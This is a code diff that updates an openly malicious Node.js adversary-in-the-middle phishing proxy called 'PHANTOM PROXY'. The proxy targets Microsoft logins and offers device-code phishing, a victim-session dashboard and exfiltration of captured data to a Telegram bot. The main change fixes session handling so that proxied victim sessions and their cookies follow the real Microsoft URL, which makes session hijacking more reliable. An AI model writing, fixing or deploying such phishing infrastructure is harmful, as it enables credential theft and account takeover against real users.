@@ -1,8 +1,9 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.11 — Markdown (Legacy) to avoid escaping parentheses
+// 🥔 PHANTOM PROXY v10.12 — Mutation Session Fix + Markdown (Legacy)
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
-// ✅ All features intact, parse_mode changed to 'Markdown'
+// ✅ Fixed: mutation handler now updates session to match the real Microsoft URL
+// ✅ All features intact: AiTM, Device, Telegram, Dashboard, WebSocket
 // ============================================================
 
 const http = require("http");
@@ -116,10 +117,9 @@ const USER_AGENTS = [
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
-// ── 📝 MARKDOWN ESCAPE (still used for safety, but not required for parentheses) ──
+// ── 📝 MARKDOWN ESCAPE (legacy, safe for parentheses) ──
 function escapeMarkdown(text) {
     if (!text) return '';
-    // Legacy Markdown doesn't require escaping parentheses, but we keep it for underscores etc.
     const specialChars = ['_', '*', '[', ']', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     let escaped = text;
     for (const char of specialChars) {
@@ -302,7 +302,7 @@ async function sendToTelegram(data, type = 'capture', ip = null) {
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
-            parse_mode: 'Markdown',  // ← Legacy Markdown, no need to escape parentheses
+            parse_mode: 'Markdown',
             disable_web_page_preview: true
         }, { timeout: 5000 });
         console.log(`✅ Telegram exfil [${type}] for session ${sessionId} — response:`, response.status);
@@ -393,7 +393,7 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     }
 }
 
-// ── Cookie management (unchanged) ──
+// ── Cookie management ──
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
     const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
     if (sCookie.length < 2) return false;
@@ -1003,7 +1003,7 @@ const server = http.createServer(async (req, res) => {
 
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.11', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        res.end(JSON.stringify({ status: 'healthy', version: '10.12', uptime: process.uptime(), timestamp: new Date().toISOString() }));
         return;
     }
 
@@ -1198,7 +1198,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (FULL)
+// 🔧 DASHBOARD API HANDLER (FULL – unchanged from v10.11)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -2403,6 +2403,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                         proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                         proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+                                        // 🔥 FIX: Update session to match the real Microsoft URL
+                                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestURL.protocol;
+                                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestURL.hostname;
+                                        VICTIM_SESSIONS[currentSession].path = proxyRequestPath;
+                                        VICTIM_SESSIONS[currentSession].port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
+                                        VICTIM_SESSIONS[currentSession].host = proxyRequestURL.host;
+                                        // Debug log
+                                        const cookieHeader = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
+                                        console.log('🍪 Mutation cookies for session', currentSession, ':', cookieHeader);
                                     } catch (error) {
                                         displayError("Mutation parse failed", error, proxyRequestPath);
                                         clientResponse.writeHead(404, { "Content-Type": "text/html" });
@@ -2631,7 +2640,7 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '::', () => {
-    console.log(`✅ PHANTOM PROXY v10.11 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.12 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
